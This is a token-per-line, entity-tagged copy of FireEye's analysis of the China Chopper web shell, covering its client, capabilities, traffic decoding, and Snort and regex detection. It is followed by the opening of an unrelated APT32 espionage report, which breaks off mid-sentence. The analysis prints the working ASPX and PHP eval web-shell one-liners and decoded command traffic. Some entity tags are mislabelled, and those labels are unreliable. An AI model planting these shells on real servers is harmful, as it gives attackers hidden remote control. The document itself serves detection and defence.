client
with
MD5
hash
code
1
Tyler's
China B_malware.backdoor
Chopper's I
post
is
available
at
http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html B_url.normal
.

The
client
binary
is
packed
with
UPX
and
is
220,672
bytes
in
size
,
as
shown
in
Figure
1
.

Figure
1
:
Client
binary
viewed
in
WinHex

The
executable
file
compressor
UPX
unpacks
the
binary
to
reveal
details
hidden
by
the
packer
.

C:\Documents
and
Settings\Administrator\Desktop>upx
-d
5001ef50c7e869253a7c152a638eab8a.exe
-o
decomp.exe

Ultimate
Packer
for
eXecutables

Copyright
(
C
)
1996
-
2011

UPX
3.08w
Markus
Oberhumer
,
Laszlo
Molnar
&
John
Reiser
Dec
12th
2011

File
size
Ratio
Format
Name
--------------------
------
-----------
----------700416
<-
220672
31.51%
win32/pe
decomp.exe

Unpacked
1
file
.



PEiD
(
a
free
tool
for
detecting
packers
,
cryptors
,
and
compilers
found
in
PE
executable
files),2
reveals
that
the
unpacked
client
binary
was
written
in
Microsoft
Visual
C++
6.0
,
as
shown
in
Figure
2
.

Figure
2
:
PEiD
reveals
that
the
binary
was
written
using

Visual
C++
6.0

Because
the
strings
are
not
encoded
,
examining
them
in
the
unpacked
binary
exposes
how
the
backdoor
communicates
.

Appearing
in
the
strings
are
an
intriguing
reference
to
google.com.hk
using
the
Chinese
(
simplified
)
language
parameter
(
Figure
3
)
and
references
to
the
text
'
Chopper
'

(
Figure
4
)
.

Figure
3
:
Printable
strings
refer
to
www.google.com.hk B_url.normal
2
More
information
about
PEiD
is
available
at
http://www.aldeid.com/wiki/PEiD B_url.normal
.



Figure
4
:
References
to

Chopper
in
the
client
binary

In
action
,

is
a
menu-driven
GUI
full
of
convenient
attack
and
'
target-management
'
features
.

When
opened
,
the
client
displays
example
shell
entries
that
point
to
www.maicaidao.com B_url.unknown
,
which
originally
hosted
components
of
the
Web B_malware.ransom
Shell I
.

To
add
a
target
,
attackers
right
click
within
the
client
window
,
select
Add
from
the
menu
and
enter
the
target
IP
address
,
password
,
and
encoding
as
shown
in
Figure
5
.

Figure
5
:
Picture
of
the

China B_malware.backdoor
Chopper I
Web B_malware.ransom
Shell I
interface

Server-side
Payload
Component

But
the
client
is
only
half
of
the
remote
access
tool
(
RAT)—and
not
likely
the
part
that
would
appear
on
a
targeted
network
.
Its
communication
relies
on
a
payload
in
the
form
of
a
small
Web
application
.

This
payload
is
available
in
a
variety
of
languages
such
as
ASP
,
ASPX
,
PHP
,
JSP
,
and
CFM
.
Table
2
shows
some
of
the
original
files
available
for
download
shown
with
their
MD5
hashes
.

CHINA

Web B_malware.ransom
Shell I
Payload

MD5
Hash

Customize.aspx  B_url.unknown
8aa603ee2454da64f4c70f24cc0b5e08  B_hash

Customize.cfm B_url.unknown
ad8288227240477a95fb023551773c84  B_hash

Customize.jsp B_url.unknown
acba8115d027529763ea5c7ed6621499  B_hash

Table
2
:
Original
China B_malware.backdoor
Chopper I
files
,
with
MD5
hash
codes3

Even
though
the
MD5s
are
useful
,
this
is
a
text-based
payload
that
can
be
easily
changed
,
resulting
in
a
new
MD5
hash
.

Here
is
an
example
of
just
one
of
China B_malware.backdoor
Chopper's I
text-based
payloads
(
for
more
details
,
see
'

Payload
Attributes
'
on
Page
11
)
:

ASPX
:
<%@
Page
Language='Jscript'%><%eval(Request.Item['password'],'unsafe');%>

In
real-world
use
,
'
password
'
would
be
replaced
with
the
actual
password
to
be
used
in
the
client
component
when
connecting
to
the
Web B_malware.ransom
Shell I
.

3
Keith
Tyler
.
'
China B_malware.backdoor
Chopper I
Webshell
-
the
4KB
that
Owns
your
Web
Server
.
'
November
2012
.

Capabilities

The
capabilities
of
both
the
payload
and
the
client
are
impressive
considering
their
size
.

The
Web B_malware.ransom
Shell I
client
contains
a
'
Security
Scan
'
feature
,
independent
of
the
payload
,
that
gives
the
attacker
the
ability
to
spider
and
use
brute-force
password
guessing
against
authentication
portals
.

Figure
6
:
China B_malware.backdoor
Chopper I
provides
a
'
Security
Scan
'
feature

In
addition
to
vulnerability
hunting
,
China B_malware.backdoor
Chopper I
has
excellent
CnC
features
when
combining
the
client
and
payload
,
include
the
following
:
•
File
Management
(
File
explorer
)
•
Database
Management
(
DB
client
)
•
Virtual
Terminal
(
Command
shell
)

In
China B_malware.backdoor
Chopper's I
main
window
,
right-clicking
one
of
the
target
URLs
brings
up
a
list
of
possible
actions
(
see
Figure
7
)
.

Figure
7
:
Screenshot
of
the
CnC
client
showing
capabilities
of
the
Web B_malware.ransom
Shell I



File
Management

Used
as
a
RAT
,
China B_malware.backdoor
Chopper's I
makes
file
management
simple
.

Abilities
include
uploading
and
downloading
files
to
and
from
the
target
,
using
the
file-retrieval
tool
Wget4
to
download
files
from
the

Web
to
the
target
.

Attackers
can
also
edit
,
delete
,
copy
,
and
rename
files—and
even
change
their
time
stamp
.

Figure
8
:
File
management
provides
an
easy-to-use
menu
that
is
activated
by
right-clicking
on
a
file
name

The
Modify
the
file
time
option
is
a
surprisingly
effective
stealth
technique
.

Figure
9
shows
the
time
stamps
of
the
three
files
in
the
test
directory
before
the
Web B_malware.ransom
Shell I
modifies
the
time
stamps
.

By
default
,

Windows
Explorer
shows
only
the
'
Date
Modified
'
field
.
Without
the
time
stamp
change
,
the
Web B_malware.ransom
Shell I
easily
stands
out
because
it
is
newer
than
the
other
two
files
.

Figure
9
:
IIS
directory
showing
time
stamps
prior
to
the
time
modification
4
Wget
is
available
at
http://www.gnu.org/software/wget/ B_url.normal
.

Figure
10
shows
the
date
of
the
file
after
the
Web B_malware.ransom
Shell I
modifies
the
time
stamp
.

The
'
Date
Modified
'
value
on
the
Web B_malware.ransom
Shell I
shows
up
as
the
same
as
the
other
two
files
.

This
is
the
default
field
displayed
to
users
,
so
to
the
untrained
eye
it
easily
blends
in—especially
with
many
files
in
the
directory
.

Figure
10
:
IIS
directory
showing
time
stamps
after
the
time
modification

Clever
investigators
may
think
that
they
can
spot
the
suspicious
file
due
to
the
creation
date
being
changed
to
the
same
date
as
the
modified
date
.

But
this
is
not
necessarily
anomalous
.

Additionally
,
even
if
the
file
is
detected
,
the
forensic
timeline
is
skewed
because
the
date
that
the
attacker
planted
the
file
is
no
longer
present
.

Finding
the
real
date
that
the
file
was
planted
requires
examining
the

Master
File
Table
(
MFT
)
.

After
acquiring
the
MFT
using
FTK
,
EnCase
,
or
other
means
,
FireEye
recommends
using
mftdump.5
Written
by
FireEye
researcher
Mike
Spohn
,
mftdump
is
a
great
tool
for
extracting
and
analyzing
file
metadata
.

Table
3
shows
the
time
stamps
pulled
from
the
MFT
for
our
Web B_malware.ransom
Shell I
file
before
and
after
the
time
stamps
were
modified
.

The
'
fn*
'
fields
retain
their
original
times
,
so
some
useful
information
remains
.

Category

Pre-touch
Match

Post-touch
Match
siCreateTime
(
UTC
)
6/6/2013
16:01
2/21/2003
22:48
siAccessTime
(
UTC
)
6/20/2013
1:41
6/25/2013
18:56
siModTime
(
UTC
)
6/7/2013
0:33
2/21/2003
22:48
siMFTModTime
(
UTC
)
6/20/2013
1:54
6/25/2013
18:56
fnCreateTime
(
UTC
)
6/6/2013
16:01
6/6/2013
16:01
fnAccessTime
(
UTC
)
6/6/2013
16:03
6/6/2013
16:03
fnModTime
(
UTC
)
6/4/2013
15:42
6/4/2013
15:42
fnMFTModTime
(
UTC
)
6/6/2013
16:04
6/6/2013
16:04

Table
3
:
Time
stamps
from
MFT
5
The
mftdump
tool
is
available
at
http://malware-hunters.net/all-downloads/ B_url.normal
.

Database
Management

The
database
management
functionality
is
impressive
and
helpful
to
the
first-time
user
.

Upon
configuring
the
client
,
China B_malware.backdoor
Chopper's I
provides
example
connection
syntax
.

After
connecting
,
China B_malware.backdoor
Chopper's I
also
provides
useful
SQL
commands
.

Figure
11
:
Database
management
requires
simple
configuration
parameters
to
connect

Figure
12
:
China B_malware.backdoor
Chopper's I
database
management
feature
lets
users
interact
with
a
database
and
even
provides
helpful
prepopulated
commands

Command
Shell
Access

Finally
,
China B_malware.backdoor
Chopper's I
provides
command
shell
access
for
OS-level
interaction
,
further
demonstrating
its
versatility
.

Figure
13
:
Virtual
terminal
provides
a
command
shell
for
OS
interaction

Payload
Attributes

China B_malware.backdoor
Chopper's I
is
stealthy
due
to
a
number
of
factors
,
including
the
following
:
•
Size
•
Server-side
content
•
Client-side
content
•
AV
detection
rate
(
or
lack
thereof
)

Size

Malicious
and
benign
software
usually
suffers
from
the
same
principle
:
more
features
equals
more
code
,
which
equals
larger
size
.

Considering
how
many
features
China B_malware.backdoor
Chopper's I
offers
,
it
is
incredibly
small—just
73
bytes
for
the
ASPX
version
,
or
4
kilobytes
on
disk
(
see
Figure
14
)
.

Compare
that
to
other
Web B_malware.ransom
shells  I
such
as
Laudanum
(
619
bytes
)
or
RedTeam
Pentesting
(
8,527
bytes
)
.

China B_malware.backdoor
Chopper's I
is
so
small
and
simple
that
an
attacker
could
conceivably
type
the
contents
of
the
shell
by
hand
.

Figure
14
:
China B_malware.backdoor
Chopper's I
file
properties

Server-Side
Content

The
server-side
content
could
easily
be
overlooked
among
the
other
files
associated
with
a
vanilla
install
of
a
complex
application
.

The
code
does
not
look
malicious—just
odd
.

Figure
15
:
The
content
of
the
file
seems
relatively
benign
,
especially
if
with
a
safe-sounding
word
like
'
Security
'
as
the
shell
password

Below
are
the
contents
of
the
Web B_malware.ransom
Shell I
for
two
of
its
varieties
.

ASPX
:

PHP
:
<%@
Page
Language='Jscript'%><%eval(RequestItem['password'],'unsafe');%>
<?php
@eval($_POST['password']);?>

Client-Side
Content

Because
all
of
the
code
is
server-side
language
that
does
not
generate
client-side
code
,
browsing
to
the
Web B_malware.ransom
Shell I
and
viewing
the
source
as
a
client
reveals
nothing
.

Figure
16
:
Viewing
the
source
of
the

Web B_malware.ransom
Shell I
reveals
nothing
to
the
client

Anti-Virus
Detection
Rate

Running
the
Web B_malware.ransom
Shell I
through
the
virus-scanning
website
'
No
Virus
Thanks
'
shows
a
detection
rate
of
0
out
of
14
,
indicating
that
most
,
if
not
all
,
anti-virus
tools
would
miss
the
Web B_malware.ransom
Shell I
on
an
infected
system
.

Figure
17
:
Results
of
multiple
anti-virus
engine
inspections
showing
China

Chopper
coming
up
clean

The
same
holds
true
for
VirusTotal
.
None
of
its
47
anti-virus
engines
flags
China B_malware.backdoor
Chopper's I
as
malicious
.

Figure
18
:
Results
of
multiple
AV
engine
inspections
showing
the

Web B_malware.ransom
Shell I
comes
up
clean

Platform

China B_malware.backdoor
Chopper's I
can
run
on
any
Web
server
capable
of
running
JSP
,
ASP
,
ASPX
,
PHP
,
or
CFM—the
majority
of
Web
application
languages
.
China B_malware.backdoor
Chopper's I
can
also
run
transparently
on
both
Windows
and
Linux
.

This
OS
and
application
flexibility
make
China B_malware.backdoor
Chopper's I
an
even
more
dangerous
Web B_malware.ransom
Shell I
.

'
Server-side
Payload
Component
'
on
Page
5
showed
China B_malware.backdoor
Chopper's I
executing
on
a
Windows
2003
IIS
server
using
ASPX
.

Figure
19
shows
it
running
on
Linux
with
PHP
.
Here
,
the
contents
of
the
PHP
version
are
just
as
minimalistic
.

Figure
19
:
This
command
is
all
that
it
takes
to
run
on
Linux
with
PHP

While
the
available
options
differ
depending
on
what
platform
China B_malware.backdoor
Chopper's I
is
running
on
,
the
file
management
features
in
Linux
(
see
Figure
20
)
are
similar
to
those
in
Windows
.

Figure
20
:
File
browsing
on
a
target
system
running
Linux

The
database
client
example
shown
in
Figure
21
is
MySQL
instead
of
MS-SQL
,
but
it
offers
many
of
the
same
capabilities
.

The
virtual
terminal
looks
familiar
(
Figure
22
)
,
but
uses
Linux
commands
instead
of
Windows
because
they
are
ultimately
interpreted
by
the
underlying
operating
system
.

Figure
21
:
Database
management
from
a
target
system
running
Linux

Figure
22
:
Virtual
terminal
from
a
target
system
running
Linux

Delivery
Mechanism

China B_malware.backdoor
Chopper's I
delivery
mechanism
is
flexible
due
to
the
size
,
format
,
and
simplicity
of
the
malware's
payload
.

This
small
,
text-based
payload
can
be
delivered
using
any
of
the
following
mechanisms
:
•
WebDAV
file
upload
•
JBoss
jmx-console
or
Apache
Tomcat
management
pages
(
For
more
details
on
this
attack
vector
,
read
FireEye
consultant
Tony
Lee's
explanation)6
•
Remote
exploit
with
a
file
drop
•
Lateral
propagation
from
other
access

Traffic
Analysis

After
examining
the
server-side
payload
and
the
client
used
to
control
the
Web B_malware.ransom
Shell I
,
the
next
step
to
understanding
China B_malware.backdoor
Chopper's I
is
observing
its
traffic
.

Having
both
the
server
and
client
components
enables
researchers
to
start
a
packet
capture
to
view
the
contents
of
typical
traffic
.

As
shown
in

Figure
23
,
the
client
initiates
the
connection
over
TCP
port
80
using
the
HTTP
POST
method
.

Figure
23
:
A
packet
capture
shows
that
the
Web B_malware.ransom
Shell I
traffic
is
HTTP
POST
traffic
over
TCP
port
80
6
Tony
Lee
.

'
Manually
Exploiting
Tomcat
Manager
.
'
September
2012
.

Because
this
is
TCP
traffic
,
researchers
can
'
follow
the
TCP
'
stream
in
Wireshark
,
a
popular
open-source
network-protocol
analyzer
that
works
in
Unix
and
Windows.7
In
Figure
24
,
the
traffic
in
red
at
the
top
is
from
the
attacker
(
Web
client
)
.

The
traffic
shown
in
blue
at
the
bottom
is
the
response
from
the
target
(
Web B_malware.ransom
Shell I
)
.

Figure
24
:
After
following
the
TCP
stream
,
researchers
can
see
that
the
majority
of
the
attacker
traffic
is
Base64
encoded
7
Wireshark
is
available
at
http://www.wireshark.org/ B_url.normal
.

As
highlighted
above
,
the
majority
of
the
attacker
traffic
appears
to
be
Base64
encoded
.

This
is
not
a
problem
though
,
because
it
can
be
easily
decoded
.

Using
the
'
TextWizard
'
feature
of
the
free
Fiddler

Web
debugger
reveals
what
the
attacker
is
sending.8
(
Note
:
%3D
is
a
URL-encoded
representation
of
the
equal
sign
(
'
=
'
)
.

Fiddler
needs
this
to
be
converted
to
an
equal
sign
for
proper
decoding
.
)

Raw
attacker
traffic
:

Password=Response.Write('->|');
var
err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001
)
.

GetString(System
.
Convert.FromBase64String
(
'
dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3R B_hash
lbS5UZXh0LkVuY29kaW5n B_hash

LkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc B_hash
2U2NFN0cmluZyhSZXF1ZX B_hash

N0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXN B_hash
zKCk7dmFyIG91dDpTeXN0 B_hash

ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTa B_hash

GVsbEV4ZWN1dGU9ZmFsc2 B_hash

U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJ B_hash
yb3I9dHJ1ZTtlLlN0YXJ0 B_hash

SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY B_hash
29kaW5nKDY1MDAxKS5HZX B_hash

RTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1 B_hash
bInoyIl0pKTtlLlN0YXJ0 B_hash

KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2Uo  B_hash

KTtSZXNwb25zZS5Xcml0ZS  B_hash
hvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D')),'unsafe');}
catch(err){Response.Write
(
'
ERROR://
'
%2Berr.message);}Response.Write('|<-');Response
.

End();&z1=Y21k&z2=Y2QgL2QgImM6

XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D  B_hash

As
shown
In
Figure
25
,
the
Fiddler
Web
debugger
text
wizard
easily
converts
the
raw
traffic
from

Base64
to
plain
text
.
8
Fiddler
is
available
at
http://fiddler2.com/  B_url.normal
.

Figure
25
:
Fiddler
Web
debugger
decodes
the
Base64
traffic

Decoded
traffic
:
varc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(65001
)
.

GetString(System.Convert.FromBase64String(Request.Item['z1'])));
vare=newSystem.Diagnostics.Process();
varout:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;c.RedirectStandardError=true;
e.StartInfo=c;c.Arguments='/c'+System.Text.Encoding.GetEncoding(65001
)
.

GetString(System.Convert.FromBase64String(Request.Item['z2']));
e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();

Response.Write(out.ReadToEnd()+EI.ReadToEnd());

The
decoded
traffic
presents
something
more
readable
.

But
the
Base64-decoded
traffic
shows
an
attempt
to
decode
more
Base64
traffic
stored
as
'
z1
'
and
'
z2
.

'
The
attacker
traffic
shows
z1
and
z2
parameters
immediately
after
the
end
of
the
'
Password
'
parameter
.

The
Base64-encoded
parameters
z1
and
z2
are
highlighted
in
the
following
output
:
&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZ B_hash
jZCZlY2hvIFtFXQ%3D%3D I

Base64-decoded
parameters
z1
and
z2
:
z1=cmdz2=cd
/d
'
c:\inetpub\wwwroot\'&whoami&echo
[S]&cd&echo
[E]

This
code
explains
how
the
client
communicates
with
the
shell
.

The
'
Password
'
parameter
passes
the
code
to
the
payload
to
be
executed
.

The
z1
is
cmd
,
and
z2
contains
the
arguments
to
the
command
prompt
sent
via
cmd
/c
.

All
output
is
sent
to
standard
output
(
stdout
)
back
to
the
attacker
,
which
creates
the
following
response
to
the
whoami
command
and
the
present
working
directory
:
->|nt
authority\network
service[S]C:\Inetpub\wwwroot[E]|<-

Detection

Understanding
the
contents
of
China B_malware.backdoor
Chopper's I
and
what
its
traffic
looks
like
allows
researchers
to
detect
this
pest
both
at
the
network
and
the
host
level
.

Network

With
a
standard
Snort9
IDS
in
place
,
this
traffic
can
be
caught
with
relative
ease
.

Keith
Tyler
provides
the
following
basic
IDS
signature
in
his
previously
cited
China B_malware.backdoor
Chopper's I
blog
post:10
alert
tcp
any
any
->
any
80
(
sid:900001;
content:'base64_decode';
http_client_body;flow:to_server,established;
content:'POST';
nocase;
http_method;
;msg:'Webshell
Detected
Apache';
)

To
reduce
false
positives
,
tighten
the
Snort
IDS
signature
to
focus
on
China B_malware.backdoor
Chopper's I
by
looking
for
contents
of
'
FromBase64String
'
and
'
z1
'
as
follows
:
alert
tcp
$EXTERNAL_NET
any
->
$HTTP_SERVERS
$HTTP_PORTS
(
msg
:
'
China B_malware.backdoor
Chopper's I
with
first
Command
Detected';
flow:to_server,established;
content
:
'
FromBase64String';
content
:
'
z1';
content:'POST';
nocase;http_method;
reference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/  B_url.unknown
breaking-down-the-china-chopper-web-shell-part-i.html;
classtype:web-application-attack;
sid
:
900000101;
)

The
following
IDS
signature
looks
for
content
of
'
FromBase64String
'
and
any
combination
of
'
z
'
followed
by
one
to
three
digits—it
would
find
'
z1
'
,
'
z10
'
,
or
'
z100
'
for
example
.
The
idea
:
if
the
first
command
(
z1
)
is
missed
,
the
signature
still
catches
subsequent
commands
.
alert
tcp
$EXTERNAL_NET
any
->
$HTTP_SERVERS
$HTTP_PORTS
(
msg
:
'
China B_malware.backdoor
Chopper's I
with
all
Commands
Detected';
flow:to_
server,established;
content
:
'
FromBase64String';
content
:
'
z';
pcre
:
'
/Z\d{1,3}/i';
content:'POST';
nocase;http_method;
reference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/  B_url.unknown
breaking-down-the-china-chopper-web-shell-part-i.html;
classtype:web-application-attack;
sid
:
900000102;
)

Both
of
these
IDS
signatures
can
be
optimized
further
to
factor
depth
and
offset
.

Be
sure
to
put
a
valid

SID
in
before
implementing
and
test
the
signature
for
performance
.

9
Snort
is
available
at
http://www.snort.org/ B_url.normal
.

10
Keith
Tyler
.
'
China B_malware.backdoor
Chopper's I
Webshell
-
the
4KB
that
Owns
your
Web
Server
'
.
November
2012
.

Host

Because
the
shells
must
contain
a
predictable
syntax
,
researchers
can
quickly
attempt
to
find
files
that
have
that
code
in
play
.

Many
methods
can
be
used
to
find
files
that
contain
China B_malware.backdoor
Chopper's I
.

The
quickest
and
easiest
method
,
especially
on
a
Linux
machine
,
is
probably
using
regular
expressions
.

As
shown
in
Figure
26
,
a
quick
egrep
across
the
Web
directory
can
help
identify
infected
files
.

egrep
-re
'
[<][?]php\s\@eval[(]\$_POST\[.+\][)];[?][>]
'
*.php

Figure
26
:
Using
egrep
to
find

China B_malware.backdoor
Chopper's I

As
shown
in
Figure
26
,
the
egrep
and
regex
commands
are
a
powerful
combination
.

While
the
regex
syntax
may
seem
like
gibberish
,
mastering
it
is
not
as
difficult
as
it
seems
at
first
glance
.

Ian
Ahl
has
created
a
few
tutorials
that
can
help
improve
researchers
'
regex
skills
.

Here
are
two
to
get
started
:
•
Regex
basics
(
http://www.tekdefense.com/news/2012/10/21/tektip-ep12-regex-basics.html B_url.normal
)
•
Using
regex
with
Notepad
(
http://www.tekdefense.com/news/2013/1/6/tektip-ep19-using-regex-with-notepad.html B_url.normal
)

Windows
also
provides
a
way
to
search
files
using
regular
expressions
with
its
native
findstr
command
.

c:\Tools>findstr
/R
'
[<][?]php.\@eval[(]\$_POST.*[)];[?][>]
'
*.php
test.php:<?php
@eval($_POST['password']);?>
c:\Tools>–

Figure
27
:
Using
findstr
to
locate

China B_malware.backdoor
Chopper's I

The
command
string
differs
from
the
regex
equivalent
.

This
was
necessary
to
get
around
some
of
the
ways
that
findstr
interprets
regex
.

The
findstr
command
runs
as
follows
:
findstr
/R
'
[<][?]php.\@eval[(]\$_POST.*[)];[?][>]
'
*.php

These
examples
show
detection
in
the
PHP
shell
.

To
find
the
ASPX
shell
,
modify
the
regex
to
fit
the
syntax
of
the
ASPX
shell
as
shown
:
egrep
-re
'
[<]\%\@\sPage\sLanguage=.Jscript.\%[>][<]\%eval.Request\
.

Item.+unsafe
'
*.aspx
findstr
/R
'
[<]\%\@.Page.Language=.Jscript.\%[>][<]\%eval.Request\
.

Item.*unsafe
'
*.aspx

Researchers
unsure
where
all
of
the
PHP
or
ASPX
files
are
on
a
Windows
host
can
use
the
dir
command
with
some
extended
options
to
help
identify
Web
files
to
run
the
regex
command
against
(
see
Figure
28
)
.

dir
/S
/A
/B
*.php

Figure
28
:
Recursive
search
through

Windows
using
the
dir
command

Findstr
also
has
an
option
to
search
all
subdirectories
(
see
Figure
29
)
,
as
follows
:
findstr
/R
/S
'
[<][?]php.\@eval[(]\$_POST.*[)];[?][>]
'
*.php

Figure
29
:
Using
findstr
to
recursively
locate
multiple
instances
of
the

Web B_malware.ransom
Shell I

Conclusion

Armed
with
knowledge
about
China B_malware.backdoor
Chopper's I
features
,
platform
versatility
,
delivery
mechanisms
,
traffic
analysis
,
and
detection—along
with
a
few
free
software
tools—researchers
can
begin
eradicating
this
elegantly
designed
but
dangerous
menace
.

To
learn
more
about
how
FireEye
can
help
your
organization
find
China B_malware.backdoor
Chopper's I
and
other
advanced
malware
,
visit
www.fireeye.com B_url.normal
.

About
FireEye

FireEye
has
invented
a
purpose-built
,
virtual
machine-based
security
platform
that
provides
realtime
threat
protection
to
enterprises
and
governments
worldwide
against
the
next
generation
of
cyber
attacks
.
These
highly
sophisticated
cyber
attacks
easily
circumvent
traditional
signature-based
defenses
,
such
as
next-generation
firewalls
,
IPS
,
anti-virus
,
and
gateways
.
The
FireEye
Threat
Prevention

PlatformTM
provides
real-time
,
dynamic
threat
protection
without
the
use
of
signatures
to
protect
an
organization
across
the
primary
threat
vectors
,
including
Web
,
email
,
and
files
and
across
the
different
stages
of
an
attack
life
cycle
.

The
core
of
the
FireEye
platform
is
a
virtual
execution
engine
,
complemented
by
dynamic
threat
intelligence
,
to
identify
and
block
cyber
attacks
in
real
time
.

FireEye
has
over
1,100
customers
across
more
than
40
countries
,
including
over
100
of
the
Fortune
500
.

©
2013
FireEye
,
Inc
.

All
rights
reserved
.
FireEye
is
a
registered
trademark
of
FireEye
,
Inc
.

All
other
brands
,
products
,
or
service
names
are
or
may
be
trademarks
or
service
marks
of
their
respective
owners
.

–
RPT.CCWS.EN-US.112013

FireEye
,
Inc
.
|
1440
McCarthy
Blvd
.

Milpitas
,
CA
95035
|
408.321.6300
|
877.FIREEYE
(
347.3393
)
|
info@FireEye.com  B_url.normal
|
www.FireEye.com B_url.normal
Cyber
Espionage
is
Alive
and
Well
:
APT32
and
the
Threat
to

Global
Corporations
fireeye.com
/blog/threat-research/2017/05/cyber-espionage-apt32.html  B_url.normal

Cyber
espionage
actors
,
now
designated
by
FireEye
as
APT32 B_malware.infosteal
(
OceanLotus
Group
)
,
are
carrying
out
intrusions
into
private
sector
companies
across
multiple
industries
and
have
also
targeted
foreign
governments
,
dissidents
,
and
journalists
.

FireEye
assesses
that
APT32 B_malware.infosteal
leverages
a
unique
suite
of
fully-featured
malware
,
in
conjunction
with
commercially-available
tools
,
to
conduct
targeted
operations
that
are
aligned
with
Vietnamese
state
interests
.

APT32 B_malware.infosteal
and
FireEye's
Community
Response

In
the
course
of
investigations
into
intrusions
at
several
corporations
with
business
interests
in
Vietnam
,
FireEye's

Mandiant
incident
response
consultants
uncovered
activity
and
attacker-controlled
infrastructure
indicative
of
a
significant
intrusion
campaign
.

In
March
2017
,
in
response
to
active
targeting
of
FireEye
clients
,
the
team
launched
a
Community
Protection
Event
(
CPE
)
–
a
coordinated
effort
between
Mandiant
incident
responders
,
FireEye
as
a

Service
(
FaaS
)
,
FireEye
iSight
Intelligence
,
and
FireEye
product
engineering
–
to
protect
all
clients
from
APT32 B_malware.infosteal
activity
.

In
the
following
weeks
,
FireEye
released
threat
intelligence
products
and
updated
malware
profiles
to
customers
while
developing
new
detection
techniques
for
APT32's B_malware.infosteal
tools
and
phishing
lures
.

This
focused
intelligence
and
detection
effort
led
to
new
external
victim
identifications
as
well
as
providing
sufficient
technical
evidence
to
link
twelve
prior
intrusions
,
consolidating
four
previously
unrelated
clusters
of
threat
actor
activity
into
FireEye's
newest
named
advanced
persistent
threat
group
:
APT32 B_malware.infosteal
.

APT32 B_malware.infosteal
Targeting
of
Private
Sector
Company
Operations
in
Southeast
Asia

Since
at
least
2014
,
FireEye
has
observed
APT32
targeting
foreign
corporations
with
a
vested
interest
in
Vietnam's
manufacturing
,
consumer
products
,
and
hospitality
sectors
.

Furthermore
,
there
are
indications
that
APT32 B_malware.infosteal
actors
are
targeting
peripheral
network
security
and
technology
infrastructure
corporations
,
as
well
as
consulting
firms
that
may
have
connections
with
foreign
investors
.

Here
is
an
overview
of
intrusions
investigated
by
FireEye
that
are
attributed
to
APT32 B_malware.infosteal
:

In
2014
,
a
European
corporation
was
compromised
prior
to
constructing
a
manufacturing
facility
in
Vietnam
.

In
2016
,
Vietnamese
and
foreign-owned
corporations
working
in
network
security
,
technology
infrastructure
,
banking
,
and
media
industries
were
targeted
.

In
mid-2016
,
malware
that
FireEye
believes
to
be
unique
to
APT32 B_malware.infosteal
was
detected
on
the
networks
of
a
global
hospitality
industry
developer
with
plans
to
expand
operations
into
Vietnam
.

From
2016
through
2017
,
two
subsidiaries
of
U.S.
and
Philippine
consumer
products
corporations
,
located
inside
Vietnam
,
were
the
target
of
APT32
intrusion
operations
.

In
2017
,
APT32 B_malware.infosteal
compromised
the
Vietnamese
offices
of
a
global
consulting
firm
.

Table
1
shows
a
breakdown
of
APT32
activity
,
including
the
malware
families
used
in
each
.

Year
Country

Industry

Malware
1/11
2014
Vietnam

Network
Security

WINDSHIELD
2014
Germany

Manufacturing
2015
Vietnam

Media
2016
Philippines

Consumer
products
2016
Vietnam

Banking

WINDSHIELD

WINDSHIELD

KOMPROGO

WINDSHIELD

SOUNDBITE

BEACON

WINDSHIELD
2016
Philippines

Technology
Infrastructure
WINDSHIELD
2016
China

Hospitality
2016
Vietnam

Media
2016
United
States

Consumer
Products
2017
United
Kingdom
Consulting

WINDSHIELD

WINDSHIELD

WINDSHIELD

PHOREAL

BEACON

SOUNDBITE

SOUNDBITE

Table
1
:
APT32 B_malware.infosteal
Private
Sector
Targeting
Identified
by
FireEye

APT32 B_malware.infosteal
Interest
in
Political
Influence
and
Foreign
Governments

In
addition
to
focused
targeting
of
the
private
sector
with
ties
to
Vietnam
,
APT32 B_malware.infosteal
has
also
targeted
foreign
governments
,
as
well
as
Vietnamese
dissidents
and
journalists
since
at
least
2013
.
Here
is
an
overview
of
this
activity
:

A
public
blog
published
by
the
Electronic
Frontier
Foundation
indicated
that
journalists
,
activists
,
dissidents
,
and
bloggers
were
targeted
in
2013
by
malware
and
tactics
consistent
with
APT32 B_malware.infosteal
operations
.

In
2014
,
APT32 B_malware.infosteal
leveraged
a
spear-phishing
attachment
titled
'

Plans
to
crackdown
on
protesters
at
the

Embassy
of
Vietnam.exe
,
'
which
targeted
dissident
activity
among
the
Vietnamese
diaspora
in
Southeast

Asia
.
Also
in
2014
,
APT32 B_malware.infosteal
carried
out
an
intrusion
against
a
Western
country's
national
legislature
.

In
2015
,
SkyEye
Labs
,
the
security
research
division
of
the
Chinese
firm
Qihoo
360
,
released
a
report
detailing
threat
actors
that
were
targeting
Chinese
public
and
private
entities
including
